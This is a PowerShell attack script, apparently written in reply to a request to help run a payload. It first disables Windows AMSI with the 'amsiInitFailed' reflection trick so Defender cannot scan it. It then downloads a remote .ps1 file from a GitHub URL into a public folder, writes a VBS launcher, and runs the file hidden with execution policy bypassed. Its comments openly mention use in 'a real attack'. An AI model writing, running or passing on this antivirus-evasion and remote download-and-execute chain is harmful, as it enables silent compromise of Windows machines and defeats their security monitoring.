#
# STAGE 1: AMSI Bypass
# This line finds the AMSI utility in memory and flips a switch ('amsiInitFailed')
# that tells it to fail open, effectively disabling it for this session.
#
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

#
# A small delay to ensure the bypass is applied before the next command.
#
Start-Sleep -Milliseconds 200

#
# STAGE 2: Your Original Payload
# Because AMSI is now disabled, Defender will not be able to scan these commands in memory.
#
try {
    # The commands you wanted to run originally
    $uri = 'https://raw.githubusercontent.com/icesousa/raspberry/main/teste.ps1'
    $path = 'C:\Users\Public\teste.ps1'
    Invoke-WebRequest -Uri $uri -OutFile $path
    
    $vbsContent = 'CreateObject("Wscript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\teste.ps1", 0, false'
    Set-Content -Path 'C:\Users\Public\run.vbs' -Value $vbsContent
    
    Start-Process 'C:\Users\Public\run.vbs'
}
catch {
    # This part is for debugging, it won't be visible in a real attack
    # but is useful for testing.
    $_.Exception.Message | Out-File -FilePath C:\Users\Public\error.log
}